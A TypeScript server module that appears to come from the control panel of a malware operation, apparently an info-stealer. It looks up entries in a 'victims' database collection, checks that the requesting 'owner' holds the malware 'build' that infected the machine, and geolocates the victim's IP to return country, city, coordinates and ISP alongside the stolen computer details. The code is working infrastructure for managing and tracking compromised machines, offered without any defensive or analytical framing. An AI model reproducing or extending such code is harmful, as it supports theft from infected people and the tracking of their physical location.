import type { Db } from 'mongodb';
import { getBuildId } from '@/server';
import axios from 'axios';

const getWifi = async (ip: string) => {
  try {
    let { data } = await axios.get(`http://ip-api.com/json/${ip}`);
    return {
      country: data.country,
      region: data.regionName,
      city: data.city,
      latitude: data.lat,
      longitude: data.lon,
      isp: data.isp
    };
  } catch (_) {
    return null;
  }
};

export const getComputer = async (db: Db, owner: string, id: string) => {
  const collection = db.collection('victims');

  const victim = await collection.findOne({
    tokens: {
      $elemMatch: {
        id: id
      }
    }
  });

  if (!victim) throw Error('This victim does not exist!');
  const build = await getBuildId(db, victim.id, owner);
  if (build.owner.id !== owner) throw Error('This victim is not your property');

  const net = await getWifi(victim.computer.ip);
  return {
    ...victim.computer,
    ...net
  };
};
